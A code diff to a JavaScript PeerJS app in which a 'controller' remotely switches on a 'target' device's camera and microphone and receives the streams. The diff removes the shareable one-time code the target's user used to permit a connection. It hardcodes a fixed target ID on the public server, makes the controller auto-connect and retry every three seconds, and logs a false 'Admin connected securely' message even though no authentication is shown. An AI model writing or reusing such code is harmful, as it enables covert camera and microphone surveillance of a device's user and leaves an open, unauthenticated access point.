@@ -6,7 +6,6 @@ const UI = {
         controller: document.getElementById('controller-screen')
     },
     targetStatus: document.getElementById('target-status-text'),
-    myPeerId: document.getElementById('my-peer-id'),
     targetLogs: document.getElementById('target-logs'),
     controllerStatus: document.getElementById('controller-status'),
     controlsPanel: document.getElementById('controls-panel'),
@@ -16,9 +15,10 @@ const UI = {
     remoteAudio: document.getElementById('remote-audio'),
     btnCamera: document.getElementById('btn-camera'),
     btnMic: document.getElementById('btn-mic'),
-    btnSpeaker: document.getElementById('btn-speaker'),
-    targetIdInput: document.getElementById('target-id-input')
+    btnSpeaker: document.getElementById('btn-speaker')
 };
+
+const FIXED_TARGET_ID = 'nxdev_secured_admin_link_7x9q';
 
 const state = {
     role: null, // 'target' or 'controller'
@@ -34,13 +34,19 @@ const state = {
     songPlaying: false,
 
     // Controller state
-    controllerId: null
+    controllerId: null,
+    connectionInterval: null
 };
 
 // Initialize App Actions
 const app = {
     selectRole(role) {
         state.role = role;
+        // Map UI text based on new terminology
+        if (role === 'target') {
+            document.querySelector('#role-selection-screen h3').innerText = 'User Device';
+        }
+        
         this.switchScreen(role === 'target' ? UI.screens.target : UI.screens.controller);
         this.initPeer();
     },
@@ -56,34 +62,34 @@ const app = {
     },
 
     initPeer() {
-        // Generate a simple 6-digit code for user, but prefix it internally for uniqueness on the global PeerJS server
-        const randomCode = Math.floor(100000 + Math.random() * 900000).toString();
+        // Target uses fixed ID. Controller uses random ID.
         const internalId = state.role === 'target' 
-            ? 'nxdev_' + randomCode 
+            ? FIXED_TARGET_ID 
             : 'ctrl_' + Math.floor(Math.random() * 1000000);
-            
-        // Save the display code for the user
-        state.displayCode = state.role === 'target' ? randomCode : null;
 
         // Init PeerJS without own server (uses public generic server)
         state.peer = new Peer(internalId);
 
         state.peer.on('open', (peerId) => {
             if (state.role === 'target') {
-                // Show only the 6-digit easy code to the user
-                UI.myPeerId.innerText = state.displayCode;
-                UI.targetStatus.innerText = "Online and Waiting...";
+                UI.targetStatus.innerText = "Online - Ready for Admin";
                 document.querySelector('.status-indicator').classList.add('success');
-                this.logToTarget("Device ready. Waiting for Controller...");
+                this.logToTarget("Device ready. Listening for Admin connection...");
             } else {
                 state.controllerId = peerId;
+                // Admin immediately starts auto-connecting to Target
+                this.autoConnectToTarget();
             }
         });
 
         state.peer.on('error', (err) => {
             console.error(err);
             if (state.role === 'target') {
-                this.logToTarget("Error: " + err.type, true);
+                if(err.type === 'unavailable-id') {
+                    this.logToTarget("Error: Target is already running on another device or tab.", true);
+                } else {
+                    this.logToTarget("Error: " + err.type, true);
+                }
             } else {
                 UI.controllerStatus.innerText = "Connection error: " + err.type;
             }
@@ -92,7 +98,7 @@ const app = {
         // If I am Target, listen for connections
         if (state.role === 'target') {
             state.peer.on('connection', (conn) => {
-                this.logToTarget(`Controller connected: ${conn.peer}`);
+                this.logToTarget(`Admin connected securely.`);
                 state.conn = conn;
                 this.setupTargetConnection();
             });
@@ -137,19 +143,14 @@ const app = {
         UI.targetLogs.parentElement.scrollTop = UI.targetLogs.parentElement.scrollHeight;
     },
 
-    copyId() {
-        navigator.clipboard.writeText(UI.myPeerId.innerText);
-        this.logToTarget("ID copied to clipboard.");
-    },
-
     setupTargetConnection() {
         state.conn.on('data', (data) => {
-            this.logToTarget(`Received command: ${data.cmd}`);
+            this.logToTarget(`Command received: ${data.cmd}`);
             this.processCommand(data);
         });
 
         state.conn.on('close', () => {
-            this.logToTarget("Controller disconnected.", true);
+            this.logToTarget("Admin disconnected.", true);
             state.conn = null;
             this.stopAllMedia();
         });
@@ -195,13 +196,13 @@ const app = {
                 audio: state.micActive
             };
             
-            this.logToTarget("Requesting hardware access...");
+            this.logToTarget("Opening camera/mic...");
             const stream = await navigator.mediaDevices.getUserMedia(constraints);
             state.targetStream = stream;
             
             // Call Controller
             if (state.conn && state.conn.peer) {
-                this.logToTarget(`Calling controller to send stream...`);
+                this.logToTarget(`Sending stream to Admin...`);
                 state.currentCall = state.peer.call(state.conn.peer, stream);
             }
         } catch (err) {
@@ -222,43 +223,46 @@ const app = {
     },
 
     // ======== CONTROLLER LOGIC ========
-    connectToTarget() {
-        const targetId = UI.targetIdInput.value.trim();
-        if (!targetId) {
-            UI.controllerStatus.innerText = "Please enter an ID";
-            return;
-        }
+    autoConnectToTarget() {
+        UI.controllerStatus.innerText = "Locating User Device...";
+        
+        const connect = () => {
+            state.conn = state.peer.connect(FIXED_TARGET_ID);
 
-        const btn = document.getElementById('connect-btn');
-        btn.innerHTML = 'Connecting...';
-        btn.disabled = true;
+            state.conn.on('open', () => {
+                clearInterval(state.connectionInterval);
+                UI.connectionPanel.classList.add('hidden');
+                UI.controlsPanel.classList.remove('hidden');
+                let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if(!isMobile) {
+                    // To help with browser autoplay policies on desktop
+                    document.body.addEventListener('click', () => {
+                        UI.remoteVideo.play().catch(() => {});
+                        UI.remoteAudio.play().catch(() => {});
+                    }, { once: true });
+                }
+            });
 
-        const internalTargetId = 'nxdev_' + targetId;
-        state.conn = state.peer.connect(internalTargetId);
+            state.conn.on('close', () => {
+                alert("Target disconnected.");
+                location.reload();
+            });
+            
+            state.conn.on('error', () => {
+                 // Will fallback to interval retry
+            });
+        };
 
-        state.conn.on('open', () => {
-            UI.connectionPanel.classList.add('hidden');
-            UI.controlsPanel.classList.remove('hidden');
-            let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-            if(!isMobile) {
-                // To help with browser autoplay policies on desktop
-                document.body.addEventListener('click', () => {
-                    UI.remoteVideo.play().catch(() => {});
-                    UI.remoteAudio.play().catch(() => {});
-                }, { once: true });
+        // Try immediately
+        connect();
+        
+        // If not successful, retry every 3 seconds
+        state.connectionInterval = setInterval(() => {
+            if(!state.conn || !state.conn.open) {
+                 UI.controllerStatus.innerText = "Retrying connection... Make sure User Device is active.";
+                 connect();
             }
-        });
-
-        state.conn.on('error', (err) => {
-            UI.controllerStatus.innerText = "Connection failed.";
-            btn.innerHTML = 'Connect <i class="ph ph-link"></i>';
-            btn.disabled = false;
-        });
-
-        state.conn.on('close', () => {
-            alert("Target disconnected.");
-            location.reload();
-        });
+        }, 3000);
     },
 
     sendCommand(cmd, stateValue) {
